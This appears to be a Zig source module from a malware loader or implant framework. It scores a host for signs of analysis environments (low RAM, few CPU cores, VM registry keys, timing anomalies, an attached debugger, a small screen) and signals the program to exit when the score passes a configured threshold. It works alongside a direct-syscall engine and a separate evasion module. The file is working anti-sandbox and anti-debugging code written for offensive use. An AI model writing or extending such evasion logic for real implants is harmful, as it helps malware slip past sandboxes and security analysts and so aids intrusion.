const std = @import("std");
const types = @import("../types/types.zig");
const config = @import("config");
const engine = @import("../syscalls/engine.zig");
const evasion = @import("evasion.zig");
const dbg = @import("../syscalls/dbg.zig");

pub const AnalysisResult = struct {
    score: u32,
    flags: packed struct(u32) {
        ram_low: bool = false,
        cpu_few: bool = false,
        vm_registry: bool = false,
        timing_anomaly: bool = false,
        debugger: bool = false,
        small_screen: bool = false,
        _unused: u26 = 0,
    },
};

pub fn runAll() AnalysisResult {
    var result = AnalysisResult{ .score = 0, .flags = .{} };


    const ram = evasion.getTotalPhysicalRam();
    if (ram) |r| {
        if (r < config.VM_MIN_RAM) {
            result.score += 20;
            result.flags.ram_low = true;
        }
    } else {
        result.score += 10;
    }

    const cores = evasion.getCpuCoreCount();
    if (cores) |c| {
        if (c < config.VM_MIN_CPU_CORES) {
            result.score += 20;
            result.flags.cpu_few = true;
        }
    } else {
        result.score += 10;
    }

    if (evasion.checkRegistryVmIndicators()) {
        result.score += 25;
        result.flags.vm_registry = true;
    }

    if (evasion.checkTimingAnomaly()) {
        result.score += 20;
        result.flags.timing_anomaly = true;
    }

    if (evasion.checkDebugger()) {
        result.score += 15;
        result.flags.debugger = true;
    }

    if (engine.ssn_NtUserGetSystemMetrics != 0) {
        const screen = evasion.checkScreenResolution();
        if (screen) |s| {
            if (s.w < config.VM_MIN_SCREEN_WIDTH or s.h < config.VM_MIN_SCREEN_HEIGHT) {
                result.score += 10;
                result.flags.small_screen = true;
            }
        }
    }

    return result;
}

pub fn shouldExit(result: AnalysisResult) bool {
    return result.score >= config.EVASION_SCORE_THRESHOLD;
}

pub fn printResult(result: AnalysisResult) void {
    dbg.print("  Score: ");
    dbg.printHex(result.score);
    dbg.print("/");
    dbg.printHex(config.EVASION_SCORE_THRESHOLD);
    dbg.print("\n");

    inline for (comptime std.meta.fields(@TypeOf(result.flags))) |f| {
        if (f.name[0] == '_') continue;
        if (@field(result.flags, f.name)) {
            dbg.print("    - ");
            dbg.print(f.name);
            dbg.print(" detected\n");
        }
    }
}
